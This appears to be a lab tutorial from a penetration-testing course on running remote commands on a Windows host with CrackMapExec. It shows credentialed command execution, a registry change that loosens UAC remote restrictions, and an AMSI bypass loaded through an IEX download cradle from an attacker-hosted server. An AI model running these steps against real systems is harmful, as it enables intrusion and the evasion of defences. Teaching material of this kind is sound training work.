# Command Execution

We must check for the presence of `UAC` before attempting to execute a command as a local administrator on a remote target. When UAC is enabled, which is the case by default, only the administrator account with RID 500 (the default administrator) can execute remote commands. There are two registry keys to check if this is the case:

|                                                                                                |
| ---------------------------------------------------------------------------------------------- |
| `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy` |
| `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`      |

By default, the value of `LocalAccountTokenFilterPolicy` is set to `0`, meaning that only the built-in administrator account (RID 500) can perform administration tasks. Even if we are in the local administrator group, we will only be able to execute remote commands if the RID of our user is 500. All administrator accounts can execute administrative tasks if the value is set to `1`.

Another setting an administrator can configure is to prevent the local administrator account (RID 500) from performing remote administration tasks. This could be done by setting the registry value `FilterAdministratorToken` to `1`, meaning that the built-in administrator account (RID 500) can not perform remote administrative tasks.

***

## Command Execution as Administrator

Let's use the Administrator account to execute commands and see who is a member of the administrators' group. To run Windows command line commands, we need to use the option `-x` followed by the command we want to execute.

### **Execute a Command as Administrator**

```shell-session
$ crackmapexec smb 10.129.204.133 -u Administrator -p 'AnotherC0mpl3xP4$$' --local-auth -x "net localgroup administrators" 

SMB         10.129.204.133  445    MS01             [*] Windows 10.0 Build 17763 x64 (name:MS01) (domain:MS01) (signing:False) (SMBv1:False)
SMB         10.129.204.133  445    MS01             [+] MS01\Administrator:AnotherC0mpl3xP4$$ (Pwn3d!)
SMB         10.129.204.133  445    MS01             [+] Executed command 
SMB         10.129.204.133  445    MS01             Alias name     administrators
SMB         10.129.204.133  445    MS01             Comment        Administrators have complete and unrestricted access to the computer/domain
SMB         10.129.204.133  445    MS01             
SMB         10.129.204.133  445    MS01             Members
SMB         10.129.204.133  445    MS01             
SMB         10.129.204.133  445    MS01             -------------------------------------------------------------------------------
SMB         10.129.204.133  445    MS01             Administrator
SMB         10.129.204.133  445    MS01             INLANEFREIGHT\david
SMB         10.129.204.133  445    MS01             INLANEFREIGHT\Domain Admins
SMB         10.129.204.133  445    MS01             INLANEFREIGHT\julio
SMB         10.129.204.133  445    MS01             INLANEFREIGHT\robert
SMB         10.129.204.133  445    MS01             localadmin
SMB         10.129.204.133  445    MS01             The command completed successfully.
```

***

## Command Execution as non-RID 500 Account

In the above command, the local user `localadmin` is in the `Administrators` group, yet cannot execute the remote command:

### **Execute Command as localadmin**

```shell-session
$ crackmapexec smb 10.129.204.133 -u localadmin -p Password99! --local-auth -x whoami

SMB         10.129.204.133  445    MS01             [*] Windows 10.0 Build 17763 x64 (name:MS01) (domain:MS01) (signing:False) (SMBv1:False)
SMB         10.129.204.133  445    MS01             [+] MS01\localadmin:Password99!
```

This means that the UAC is enabled. If that's the case, we won't receive the `(Pwn3d!)` message even if the account is an administrator. If we want to revert this setting, we can set the `LocalAccountTokenFilterPolicy` to 1.

### **Changing LocalAccountTokenFilterPolicy**

```shell-session
$ crackmapexec smb 10.129.204.133 -u Administrator -p 'AnotherC0mpl3xP4$$' --local-auth -x "reg add 
HKLM\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\POLICIES\SYSTEM /V LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f"

SMB         10.129.204.133  445    MS01             [*] Windows 10.0 Build 17763 x64 (name:MS01) (domain:MS01) (signing:False) (SMBv1:False)
SMB         10.129.204.133  445    MS01             [+] MS01\Administrator:AnotherC0mpl3xP4$$ (Pwn3d!)
SMB         10.129.204.133  445    MS01             [+] Executed command 
SMB         10.129.204.133  445    MS01             The operation completed successfully.
```

```shell-session
$ crackmapexec smb 10.129.204.133 -u localadmin -p Password99! --local-auth -x whoami

SMB         10.129.204.133  445    MS01             [*] Windows 10.0 Build 17763 x64 (name:MS01) (domain:MS01) (signing:False) (SMBv1:False)
SMB         10.129.204.133  445    MS01             [+] MS01\localadmin:Password99! (Pwn3d!)
SMB         10.129.204.133  445    MS01             [+] Executed command 
SMB         10.129.204.133  445    MS01             ms01\localadmin
```

## Command Execution as Domain Account

The `LocalAccountTokenFilterPolicy` only applies to local accounts. If we got a domain user and it's part of the administrators' group, we could execute the command even with the UAC setting. In this scenario, the account `INLANEFREIGHT\robert` is a member of the administrators' groups, meaning it can execute commands even if UAC is enabled.

### **Execute Command as Robert**

```shell-session
$ crackmapexec smb 10.129.204.133 -u robert -p 'Inlanefreight01!' -x whoami

SMB         10.129.204.133  445    MS01             [*] Windows 10.0 Build 17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False) (SMBv1:False)
SMB         10.129.204.133  445    MS01             [+] inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
SMB         10.129.204.133  445    MS01             [+] Executed command 
SMB         10.129.204.133  445    MS01             inlanefreight\robert
```

***

## Command Execution with SMB

CME has four (4) different command execution methods:

<table><thead><tr><th width="40"></th><th></th></tr></thead><tbody><tr><td>1.</td><td><code>wmiexec</code> executes commands via WMI (file written on disk)</td></tr><tr><td>2.</td><td><code>atexec</code> executes commands by scheduling a task with the windows task scheduler (fileless, not working on the latest version of Windows)</td></tr><tr><td>3.</td><td><code>smbexec</code> executes commands by creating and running a service (fileless, not working on the latest version of Windows)</td></tr><tr><td>4.</td><td><code>mmcexec</code> is similar to the wmiexec method, but the commands are executed through the Microsoft Management Console (MMC).</td></tr></tbody></table>

{% hint style="info" %}
**Note:** Not all methods may work on all computers.
{% endhint %}

By default, CME will fail over to a different execution method if one fails. It attempts to execute commands in the following order:

| 1. `wmiexec` | 2. `atexec` | 3. `smbexec` | 4. `mmcexec` |
| ------------ | ----------- | ------------ | ------------ |

If we want to force CME to use only one execution method, we can specify which one using the `--exec-method` flag, for example:

### **Command Execution via SMBExec Method**

```shell-session
$ crackmapexec smb 10.129.204.133 -u robert -p 'Inlanefreight01!' --exec-method smbexec -x whoami

SMB         10.129.204.133  445    MS01             [*] Windows 10.0 Build 17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False) (SMBv1:False)
SMB         10.129.204.133  445    MS01             [+] inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
SMB         10.129.204.133  445    MS01             [+] Executed command via smbexec
SMB         10.129.204.133  445    MS01             nt authority\system
```

Alternatively, we can execute commands with PowerShell using the option `-X`:

### **PowerShell Command Execution via wmiexec**

```shell-session
$ crackmapexec smb 10.129.204.133 -u robert -p 'Inlanefreight01!' --exec-method wmiexec -X '$PSVersionTable' 

SMB         10.129.204.133  445    MS01             [*] Windows 10.0 Build 17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False) (SMBv1:False)
SMB         10.129.204.133  445    MS01             [+] inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
SMB         10.129.204.133  445    MS01             [+] Executed command via wmiexec
SMB         10.129.204.133  445    MS01             Name                           Value
SMB         10.129.204.133  445    MS01             ----                           -----
SMB         10.129.204.133  445    MS01             PSVersion                      5.1.17763.2268
SMB         10.129.204.133  445    MS01             PSEdition                      Desktop
SMB         10.129.204.133  445    MS01             PSCompatibleVersions           {1.0, 2.0, 3.0, 4.0...}
SMB         10.129.204.133  445    MS01             BuildVersion                   10.0.17763.2268
SMB         10.129.204.133  445    MS01             CLRVersion                     4.0.30319.42000
SMB         10.129.204.133  445    MS01             WSManStackVersion              3.0
SMB         10.129.204.133  445    MS01             PSRemotingProtocolVersion      2.3
SMB         10.129.204.133  445    MS01             SerializationVersion           1.1.0.1
```

When running PowerShell option `-X`, behind the scenes, CrackMapExec will do the following:

1. AMSI bypass
2. Obfuscate the payload
3. Execute the payload

### Running a Custom AMSI Bypass

These techniques may be detected when executing PowerShell. If we want to use a custom AMSI bypass payload, we can use the option `--amsi-bypass` followed by the path of the payload we want to use. Let's use, for example, the AMSI Bypass [Modified Amsi ScanBuffer Patch](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell#modified-amsi-scanbuffer-patch). We will save it to a file and create a PowerShell script to load this AMSI Bypass in memory from a web server. Here are the steps:

1. Download the file with the "Modified Amsi ScanBuffer Patch".

### **Create a File with the "Modified Amsi ScanBuffer Patch"**

```shell-session
$ wget https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/shantanukhande-amsi.ps1 -q
```

If we try to execute the payload as is, it will fail because the command will exceed the maximum length of 8191 chars.

### **Command Exceeds the Maximum Length**

```shell-session
$ crackmapexec smb 10.129.204.133 -u robert -p 'Inlanefreight01!' -X '$PSVersionTable' --amsi-bypass shantanukhande-amsi.ps1 

SMB         10.129.204.133  445    MS01             [*] Windows 10.0 Build 17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False) (SMBv1:False)
SMB         10.129.204.133  445    MS01             [+] inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
[-] Command exceeds maximum length of 8191 chars (was 3065628). exiting.


[*] Shutting down, please wait...
```

2. To solve this problem, let's create a PowerShell script that downloads and executes `shantanukhande-amsi.ps1`. We will also need to create a Python web server to host our script.

### **Creating and Hosting the PowerShell Script**

```shell-session
al1abb@htb[/htb]$ echo "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.33/shantanukhande-amsi.ps1');" > amsibypass.txt
al1abb@htb[/htb]$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

{% hint style="info" %}
**Note:** Make sure to include the semicolon (;) at the end.
{% endhint %}

From another terminal, let's run our new AMSI bypass payload:

### **Using a PowerShell Custom AMSI Bypass**

```shell-session
$ crackmapexec smb 10.129.204.133 -u robert -p 'Inlanefreight01!' -X '$PSVersionTable' --amsi-bypass amsibypass.txt

SMB         10.129.204.133  445    MS01             [*] Windows 10.0 Build 17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False) (SMBv1:False)
SMB         10.129.204.133  445    MS01             [+] inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
SMB         10.129.204.133  445    MS01             [+] Executed command 
SMB         10.129.204.133  445    MS01             -- AMSI Patch
SMB         10.129.204.133  445    MS01             -- Modified By: Shantanu Khandelwal (@shantanukhande)
SMB         10.129.204.133  445    MS01             -- Original Author: Paul LaArnAc (@am0nsec)
SMB         10.129.204.133  445    MS01             
SMB         10.129.204.133  445    MS01             [+] 64-bits process
SMB         10.129.204.133  445    MS01             [+] AMSI DLL Handle: 140724553187328
SMB         10.129.204.133  445    MS01             [+] DllGetClassObject address: 140724553193616
SMB         10.129.204.133  445    MS01             [+] Targeted address: 140724553200416
SMB         10.129.204.133  445    MS01             
SMB         10.129.204.133  445    MS01             Name                           Value
SMB         10.129.204.133  445    MS01             ----                           -----
SMB         10.129.204.133  445    MS01             PSVersion                      5.1.17763.2268
SMB         10.129.204.133  445    MS01             PSEdition                      Desktop
SMB         10.129.204.133  445    MS01             PSCompatibleVersions           {1.0, 2.0, 3.0, 4.0...}
SMB         10.129.204.133  445    MS01             BuildVersion                   10.0.17763.2268
SMB         10.129.204.133  445    MS01             CLRVersion                     4.0.30319.42000
SMB         10.129.204.133  445    MS01             WSManStackVersion              3.0
SMB         10.129.204.133  445    MS01             PSRemotingProtocolVersion      2.3
SMB         10.129.204.133  445    MS01             SerializationVersion           1.1.0.1
```

***

## Command Execution Using WinRM

We can also execute commands with WinRM protocol. By default, WinRM listens on HTTP TCP port 5985 and HTTPS TCP port 5986. One particular thing about this protocol is that it does not require a user to be an administrator to execute commands. We can use the WinRM protocol if we are members of the Administrators group, if we are members of the Remote Management Users group or if we have explicit PowerShell Remoting permissions in the session configuration.

